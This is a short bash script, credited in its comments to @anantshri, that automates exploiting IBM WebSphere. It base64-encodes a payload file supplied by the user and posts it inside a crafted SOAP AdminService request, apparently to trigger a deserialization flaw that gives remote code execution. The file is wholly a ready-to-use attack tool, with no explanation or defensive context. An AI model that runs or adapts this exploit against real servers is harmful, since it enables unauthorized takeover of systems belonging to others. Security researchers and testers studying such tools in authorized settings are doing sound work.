#!/bin/bash
# Usage websphere.sh URL payload
# Shell script created by @anantshri to automated the process
# of exploiting WebSphere
if [ $# -eq 2 ]
then
payload=`base64 $2`
url=$1
curl -i -s -k -X 'POST' \
   -H 'Content-Type: text/xml; charset=utf-8' -H 'SOAPAction: "urn:AdminService"' \
   --data-binary $'<?xml version=\'1.0\' encoding=\'UTF-8\'?>\x0d\x0a<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">\x0d\x0a<SOAP-ENV:Header xmlns:ns0=\"admin\" ns0:WASRemoteRuntimeVersion=\"8.5.5.1\" ns0:JMXMessageVersion=\"1.2.0\" ns0:SecurityEnabled=\"true\" ns0:JMXVersion=\"1.2.0\">\x0d\x0a<LoginMethod>BasicAuth</LoginMethod>\x0d\x0a</SOAP-ENV:Header>\x0d\x0a<SOAP-ENV:Body>\x0d\x0a<ns1:getAttribute xmlns:ns1=\"urn:AdminService\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\x0d\x0a<objectname xsi:type=\"ns1:javax.management.ObjectName\">'$payload'</objectname>\x0d\x0a<attribute xsi:type=\"xsd:string\">ringBufferSize</attribute>\x0d\x0a</ns1:getAttribute>\x0d\x0a</SOAP-ENV:Body>\x0d\x0a</SOAP-ENV:Envelope>' \
   $url
else 
	echo "Usage : $0 URL Payload"
fi
